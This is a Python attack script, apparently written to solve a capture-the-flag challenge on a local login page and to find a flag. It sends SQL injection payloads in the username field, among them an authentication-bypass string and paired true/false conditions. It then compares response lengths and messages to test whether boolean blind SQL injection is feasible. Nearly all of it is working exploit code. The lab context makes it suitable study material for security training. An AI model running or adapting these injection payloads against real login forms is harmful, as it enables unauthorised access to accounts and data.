import requests
import re
import string

target = "http://127.0.0.1:32895/index.php"

print("[*] Re-analyzing boolean blind SQLi with correct logic\n")

# The key insight: "not the admin" appears when login SUCCEEDS but user is not admin
# So we need to check what happens when login FAILS vs when it SUCCEEDS

print("[1] Testing authentication states:\n")

states = [
    ("admin", "wrongpass", "Valid user, wrong password"),
    ("invaliduser", "wrongpass", "Invalid user"),
    ("admin' OR '1'='1'-- -", "x", "SQL injection bypass"),
    ("admin' AND '1'='1'-- -", "x", "SQL injection true condition"),
    ("admin' AND '1'='2'-- -", "x", "SQL injection false condition"),
]

for username, password, desc in states:
    r = requests.get(target, params={'username': username, 'password': password})
    print(f"[{desc}]")
    print(f"  User: {username}")
    print(f"  Pass: {password}")
    print(f"  Length: {len(r.text)}")
    print(f"  Contains 'not the admin': {'not the admin' in r.text}")
    
    # Extract the message part
    msg_match = re.search(r'<center><h3>(.*?)</h3></center>', r.text)
    if msg_match:
        print(f"  Message: {msg_match.group(1)}")
    
    # Check for FLAG
    if 'FLAG{' in r.text:
        flags = re.findall(r'FLAG\{[^}]+\}', r.text)
        print(f"  [!!!] FLAG: {flags[0]}")
    print()

# Now let's understand: maybe successful login (but not admin) gives different response than failed login
print("\n[2] Checking if we can distinguish successful vs failed login:\n")

# Theory: If username exists and ANY password works (via SQLi), we get "not the admin"
# If username doesn't exist or condition is false, we get different message or no message

r_true = requests.get(target, params={'username': "admin' AND 1=1-- -", 'password': 'x'})
r_false = requests.get(target, params={'username': "admin' AND 1=0-- -", 'password': 'x'})

print(f"TRUE condition length: {len(r_true.text)}")
print(f"FALSE condition length: {len(r_false.text)}")

if len(r_true.text) != len(r_false.text):
    print("\n[+] Response lengths differ! We can use length-based blind SQLi")
    print(f"  TRUE length: {len(r_true.text)}")
    print(f"  FALSE length: {len(r_false.text)}")
else:
    # Check message differences
    msg_true = re.search(r'<center><h3>(.*?)</h3></center>', r_true.text)
    msg_false = re.search(r'<center><h3>(.*?)</h3></center>', r_false.text)
    
    if msg_true and msg_false:
        if msg_true.group(1) != msg_false.group(1):
            print("\n[+] Messages differ!")
            print(f"  TRUE: {msg_true.group(1)}")
            print(f"  FALSE: {msg_false.group(1)}")
    else:
        print("\n[-] Responses appear identical - blind SQLi may not be possible")
        print(f"\nTRUE response:\n{r_true.text[:500]}")
        print(f"\nFALSE response:\n{r_false.text[:500]}")

